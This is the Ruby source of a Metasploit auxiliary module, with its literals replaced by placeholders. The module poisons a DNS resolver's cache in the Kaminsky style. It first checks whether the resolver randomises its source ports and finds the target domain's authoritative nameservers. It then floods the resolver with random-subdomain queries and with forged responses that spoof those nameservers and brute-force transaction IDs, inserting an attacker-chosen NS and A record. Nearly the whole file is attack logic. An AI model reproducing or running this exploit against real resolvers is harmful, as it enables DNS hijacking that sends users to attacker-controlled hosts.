require <str> require <str> require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Capture def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > <str> ) ) register_options ( [ OptEnum . new ( <str> , [ true , <str> , <str> , [ <str> , <str> ] , <str> ] ) , OptPort . new ( <str> , [ true , <str> , nil ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptAddress . new ( <str> , [ true , <str> , <str> ] ) , OptAddress . new ( <str> , [ true , <str> , <str> ] ) , OptInt . new ( <str> , [ true , <str> , <int> ] ) , OptInt . new ( <str> , [ true , <str> , rand ( <int> ) + <int> ] ) , ] , self . class ) deregister_options ( <str> , <str> ) end def auxiliary_commands return { <str> = > <str> } end def cmd_racer ( * args ) targ = args [ <int> ] || rhost ( ) dom = args [ <int> ] || <str> if ! ( targ and targ . length > <int> ) print_status ( <str> ) return end calculate_race ( targ , dom ) end def check targ = rhost srv_sock = Rex :: Socket . create_udp ( <str> = > targ , <str> = > <int> ) random = false ports = { } lport = nil reps = <int> <int> . upto ( <int> ) do | i | req = Resolv :: DNS :: Message . new txt = <str> i <str> $$ <str> ( rand ( ) * <int> ) . to_i <str> req . add_question ( txt , Resolv :: DNS :: Resource :: IN :: TXT ) req . rd = <int> srv_sock . put ( req . encode ) res , addr = srv_sock . recvfrom ( <int> , <int> . <int> ) if res and res . length > <int> reps += <int> res = Resolv :: DNS :: Message . decode ( res ) res . each_answer do | name , ttl , data | if ( name . to_s == txt and data . strings . join ( <str> ) =~ <str> ) t_addr , t_port = $1 . split ( <str> ) vprint_status ( <str> t_addr <str> t_port <str> ) t_port = t_port . to_i if ( lport and lport != t_port ) random = true end lport = t_port ports [ t_port ] || = <int> ports [ t_port ] += <int> end end end if ( i > <int> and ports . keys . length == <int> ) break end end srv_sock . close if ( ports . keys . length == <int> ) vprint_error ( <str> ) return Exploit :: CheckCode :: Unknown end if ( reps < <int> ) vprint_warning ( <str> ) end if ( random ) ports_u = ports . keys . length ports_r = ( ( ports . keys . length / <int> . <int> ) * <int> ) . to_i print_status ( <str> ports_u <str> ports_r <str> ) if ( ports_r != <int> ) vprint_status ( <str> ) return Exploit :: CheckCode :: Appears end else vprint_error ( <str> ) return Exploit :: CheckCode :: Vulnerable end Exploit :: CheckCode :: Safe end def run check_pcaprub_loaded target = rhost ( ) source = Rex :: Socket . source_address ( target ) saddr = datastore [ <str> ] sport = datastore [ <str> ] hostname = datastore [ <str> ] + <str> address = datastore [ <str> ] recons = datastore [ <str> ] xids = datastore [ <str> ] . to_i newttl = datastore [ <str> ] . to_i xidbase = rand ( <int> ) + <int> numxids = xids domain = hostname . sub ( <str> , <str> ) srv_sock = Rex :: Socket . create_udp ( <str> = > target , <str> = > <int> ) if sport . to_i == <int> req = Resolv :: DNS :: Message . new txt = <str> $$ <str> ( rand ( ) * <int> ) . to_i <str> req . add_question ( txt , Resolv :: DNS :: Resource :: IN :: TXT ) req . rd = <int> srv_sock . put ( req . encode ) res , addr = srv_sock . recvfrom ( ) if res and res . length > <int> res = Resolv :: DNS :: Message . decode ( res ) res . each_answer do | name , ttl , data | if ( name . to_s == txt and data . strings . join ( <str> ) =~ <str> ) t_addr , t_port = $1 . split ( <str> ) sport = t_port . to_i print_status ( <str> sport <str> ) if target != t_addr print_status ( <str> target <str> t_addr <str> ) end end end end end begin query = Resolv :: DNS :: Message . new query . add_question ( hostname , Resolv :: DNS :: Resource :: IN :: A ) query . rd = <int> begin cached = false srv_sock . put ( query . encode ) answer , addr = srv_sock . recvfrom ( ) if answer and answer . length > <int> answer = Resolv :: DNS :: Message . decode ( answer ) answer . each_answer do | name , ttl , data | if ( ( name . to_s + <str> ) == hostname ) t = Time . now + ttl print_error ( <str> name <str> ) print_error ( <str> t <str> ) cached = true select ( nil , nil , nil , ttl ) end end end end until not cached rescue :: Interrupt raise $! rescue :: Exception = > e print_error ( <str> e . class <str> e <str> e . backtrace <str> ) end res0 = Net :: DNS :: Resolver . new ( <str> = > [ recons ] , <str> = > false , <str> = > true ) print_status <str> target <str> hostname <str> address <str> print_status <str> domain <str> answer0 = res0 . send ( domain , Net :: DNS :: NS ) barbs = [ ] answer0 . answer . each do | rr0 | print_status <str> rr0 . type <str> rr0 . inspect <str> if rr0 . type == <str> print_status <str> rr0 . nsdname <str> answer1 = res0 . send ( rr0 . nsdname ) answer1 . answer . each do | rr1 | print_status <str> rr1 . type <str> rr1 . inspect <str> res2 = Net :: DNS :: Resolver . new ( <str> = > rr1 . address , <str> = > false , <str> = > false , <str> = > <int> ) print_status <str> rr1 . address <str> domain <str> answer2 = res2 . send ( domain , Net :: DNS :: SOA ) if answer2 and answer2 . header . auth? and answer2 . header . anCount > = <int> nsrec = { <str> = > rr0 . nsdname , <str> = > rr1 . address } barbs << nsrec print_status <str> rr0 . nsdname <str> domain <str> end end end end if barbs . length == <int> print_status ( <str> ) srv_sock . close close_pcap return end if ( xids == <int> ) print_status ( <str> ) qcnt = calculate_race ( target , domain , <int> ) numxids = ( ( qcnt * <int> . <int> ) / barbs . length ) . to_i if ( numxids == <int> ) print_status ( <str> ) srv_sock . close close_pcap return end print_status ( <str> numxids <str> barbs . length <str> ) end queries = <int> responses = <int> open_pcap unless self . capture print_status ( <str> hostname <str> target <str> sport <str> ) while true randhost = Rex :: Text . rand_text_alphanumeric ( rand ( <int> ) + <int> ) + <str> + domain req = Resolv :: DNS :: Message . new req . id = rand ( <int> ** <int> ) req . add_question ( randhost , Resolv :: DNS :: Resource :: IN :: A ) req . rd = <int> src_ip = source if ( saddr == <str> ) src_ip = Rex :: Text . rand_text ( <int> ) . unpack ( <str> ) . join ( <str> ) end p = PacketFu :: UDPPacket . new p . ip_saddr = src_ip p . ip_daddr = target p . ip_ttl = <int> p . udp_sport = ( rand ( ( <int> ** <int> ) - <int> ) + <int> ) . to_i p . udp_dport = <int> p . payload = req . encode p . recalc capture_sendto ( p , target ) queries += <int> req . add_answer ( randhost , newttl , Resolv :: DNS :: Resource :: IN :: A . new ( address ) ) req . add_authority ( domain , newttl , Resolv :: DNS :: Resource :: IN :: NS . new ( Resolv :: DNS :: Name . create ( hostname ) ) ) req . add_additional ( hostname , newttl , Resolv :: DNS :: Resource :: IN :: A . new ( address ) ) req . qr = <int> req . ra = <int> p . udp_sport = <int> p . udp_dport = sport . to_i xidbase . upto ( xidbase + numxids - <int> ) do | id | req . id = id p . payload = req . encode barbs . each do | barb | p . ip_saddr = barb [ <str> ] . to_s p . recalc capture_sendto ( p , target ) responses += <int> end end if queries % <int> == <int> print_status ( <str> queries <str> responses <str> ) if ( xids == <int> ) print_status ( <str> ) qcnt = calculate_race ( target , domain , <int> ) numxids = ( ( qcnt * <int> . <int> ) / barbs . length ) . to_i if ( numxids == <int> ) print_status ( <str> ) srv_sock . close close_pcap return end print_status ( <str> numxids <str> barbs . length <str> ) end end if queries % <int> == <int> begin query = Resolv :: DNS :: Message . new query . add_question ( hostname , Resolv :: DNS :: Resource :: IN :: A ) query . rd = <int> srv_sock . put ( query . encode ) answer , addr = srv_sock . recvfrom ( ) if answer and answer . length > <int> answer = Resolv :: DNS :: Message . decode ( answer ) answer . each_answer do | name , ttl , data | if ( ( name . to_s + <str> ) == hostname ) print_status ( <str> queries <str> responses <str> name <str> address <str> ) print_status ( <str> ttl <str> data <str> ) close_pcap return end end end rescue :: Interrupt raise $! rescue :: Exception = > e print_error ( <str> e . class <str> e <str> e . backtrace <str> ) end end end end def calculate_race ( server , domain , num = <int> ) q_beg_t = nil q_end_t = nil cnt = <int> times = [ ] hostname = Rex :: Text . rand_text_alphanumeric ( rand ( <int> ) + <int> ) + <str> + domain sock = Rex :: Socket . create_udp ( <str> = > server , <str> = > <int> ) req = Resolv :: DNS :: Message . new req . add_question ( hostname , Resolv :: DNS :: Resource :: IN :: A ) req . rd = <int> req . id = <int> q_beg_t = Time . now . to_f sock . put ( req . encode ) req . rd = <int> while ( times . length < num ) res , addr = sock . recvfrom ( <int> , <int> . <oct> ) if res and res . length > <int> res = Resolv :: DNS :: Message . decode ( res ) if ( res . id == <int> ) times << [ Time . now . to_f - q_beg_t , cnt ] cnt = <int> hostname = Rex :: Text . rand_text_alphanumeric ( rand ( <int> ) + <int> ) + <str> + domain sock . close sock = Rex :: Socket . create_udp ( <str> = > server , <str> = > <int> ) q_beg_t = Time . now . to_f req = Resolv :: DNS :: Message . new req . add_question ( hostname , Resolv :: DNS :: Resource :: IN :: A ) req . rd = <int> req . id = <int> sock . put ( req . encode ) req . rd = <int> end cnt += <int> end req . id += <int> sock . put ( req . encode ) end min_time = ( times . map { | i | i [ <int> ] } . min * <int> ) . to_i / <int> . <int> max_time = ( times . map { | i | i [ <int> ] } . max * <int> ) . to_i / <int> . <int> sum = <int> times . each { | i | sum += i [ <int> ] } avg_time = ( ( sum / times . length ) * <int> ) . to_i / <int> . <int> min_count = times . map { | i | i [ <int> ] } . min max_count = times . map { | i | i [ <int> ] } . max sum = <int> times . each { | i | sum += i [ <int> ] } avg_count = sum / times . length sock . close print_status ( <str> times . length <str> min_time <str> max_time <str> avg_time <str> min_count <str> max_count <str> avg_count <str> ) avg_count end end 
